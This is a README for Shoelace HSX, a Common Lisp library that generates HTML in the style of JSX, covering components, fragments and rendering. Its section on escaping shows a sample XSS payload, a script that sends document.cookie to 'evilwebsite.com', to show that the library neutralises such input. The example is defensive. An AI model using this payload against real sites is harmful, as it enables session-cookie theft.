# Shoelace HSX – Hypertext S-expression

**Shoelace HSX** is a simple and powerful HTML generation library for Common Lisp, inspired by JSX. It allows you to write HTML using native Lisp syntax.

This is a fork of the original HSX library by @skyizwhite,
[find it here](https://github.com/skyizwhite/hsx)

It adds all the shoelace elements as builtins.

## ⚙️ How HSX Works

Every tag or component inside an `(shoelace-hsx ...)` form is transformed into a Lisp expression of the form:

```lisp
(create-element type props children)
```

For example:

```lisp
(shoelace-hsx
  (article :class "container"
    (h1 "Title")
    (p "Paragraph")
    (~share-button :service :x))
```
Is internally transformed (by macro expansion) into:

```lisp
(create-element :article
                (list :class "container")
                (list (create-element :h1
                                      (list)
                                      (list "Title"))
                      (create-element :p
                                      (list)
                                      (list "Paragraph"))
                      (create-element #'~share-button
                                      (list :service :x)
                                      (list))))
```

## 🚀 Quick Example

```lisp
(shoelace-hsx
  (div :id "main" :class "container"
    (h1 "Hello, HSX!")
    (p "This is a simple paragraph.")))
```

Generates:

```html
<div id="main" class="container">
  <h1>Hello, HSX!</h1>
  <p>This is a simple paragraph.</p>
</div>
```

## 📝 Rendering

Use `render-to-string` to convert an HSX structure to a string of HTML:

```lisp
(render-to-string
  (shoelace-hsx ...))
``` 

## 🔐 Escaping text

All elements automatically escape special characters in content to prevent XSS and HTML injection:

```lisp
(shoelace-hsx
  (div "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))
```
Outputs:

```html
<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>
```

Use the special tag `raw!` to inject trusted, unescaped HTML:

```lisp
(shoelace-hsx
  (article (raw! "HTML text here ..."))
```

## 🧩 Fragments

Use `<>` tag to group multiple sibling elements without wrapping them in a container tag:

```lisp
(shoelace-hsx
  (<>
    (p "One")
    (p "Two")))
```

Outputs:

```html
<p>One</p>
<p>Two</p>
```

Note: `raw!` tag is a fragment that disables HTML escaping for its children.

## 🧱 Components

Define reusable components using `defcomp` macro. Component names must start with `~`.

*Keyword-style*

```lisp
(defcomp ~card (&key title children)
  (shoelace-hsx
    (div :class "card"
      (h2 title)
      children)))
```

*Property-list style*

```lisp
(defcomp ~card (&rest props)
  (shoelace-hsx
    (div :class "card"
      (h2 (getf props :title))
      (getf props :children))))
```

### Usage

```lisp
(shoelace-hsx
  (~card :title "Hello"
    (p "This is a card.")))
```

Outputs:

```html
<div class="card">
  <h2>Hello</h2>
  <p>This is a card.</p>
</div>
```

## 🧬 Logic and Interpolation

You can freely embed Lisp expressions, conditionals, and loops inside HSX forms:

```lisp
(shoelace-hsx
  (div
    (if (> (random 10) 5)
        (shoelace-hsx (p "High!"))
        (shoelace-hsx (p "Low!")))))
```

Or loop:

```lisp
(shoelace-hsx
  (ul
    (loop :for item :in todo-list :collect
      (shoelace-hsx (li item))))))
```

## Utils

- `(clsx &rest strs)`: A utility function for constructing class strings conditionally. It removes `nil` from the string list, then joins the remaining strings with spaces.

## 📄 License

MIT License

© 2024 Akira Tempaku

© 2018 Bo Yao (original [flute](https://github.com/ailisp/flute) project)
 
